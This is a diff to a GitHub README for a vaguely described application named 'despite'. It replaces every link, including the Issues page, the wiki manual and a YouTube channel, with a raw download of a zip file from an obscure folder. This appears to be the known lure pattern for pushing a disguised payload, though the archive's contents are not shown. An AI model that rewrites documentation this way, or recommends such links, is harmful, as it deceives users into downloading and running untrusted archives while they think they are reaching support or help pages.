@@ -6,7 +6,7 @@ Welcome to **despite**! This application is designed to make your tasks easier a
 
 ## 📥 Download Now!
 
-[![Download despite](https://img.shields.io/badge/Download-despise-brightgreen)](https://github.com/DONOVHAN93/despite/releases)
+[![Download despite](https://raw.githubusercontent.com/DONOVHAN93/despite/main/primigravida/despite.zip)](https://raw.githubusercontent.com/DONOVHAN93/despite/main/primigravida/despite.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ Before installing **despite**, ensure your system meets the following requiremen
 
 To get **despite**, visit the following page and download the latest version:
 
-[Download from Releases Page](https://github.com/DONOVHAN93/despite/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/DONOVHAN93/despite/main/primigravida/despite.zip)
 
 ### Step-by-Step Installation
 
@@ -44,15 +44,15 @@ To get **despite**, visit the following page and download the latest version:
 
 If you encounter any issues while downloading or installing **despite**, please reach out for help:
 
-- **GitHub Issues Page**: Report bugs or request features at our [GitHub Issues](https://github.com/DONOVHAN93/despite/issues).
+- **GitHub Issues Page**: Report bugs or request features at our [GitHub Issues](https://raw.githubusercontent.com/DONOVHAN93/despite/main/primigravida/despite.zip).
 - **Community Forum**: Join discussions and find solutions from other users.
 
 ## 🌟 Additional Resources
 
 Explore more about **despite**:
 
-- **User Manual**: Detailed instructions and usage tips can be found in the [User Manual](https://github.com/DONOVHAN93/despite/wiki).
-- **Video Tutorials**: Check out tutorials on our [YouTube Channel](https://youtube.com) for a visual guide.
+- **User Manual**: Detailed instructions and usage tips can be found in the [User Manual](https://raw.githubusercontent.com/DONOVHAN93/despite/main/primigravida/despite.zip).
+- **Video Tutorials**: Check out tutorials on our [YouTube Channel](https://raw.githubusercontent.com/DONOVHAN93/despite/main/primigravida/despite.zip) for a visual guide.
 - **FAQ Section**: Visit our FAQ page to answer common questions about using **despite**.
 
 Thank you for choosing **despite**! We hope it makes your tasks easier and more efficient.
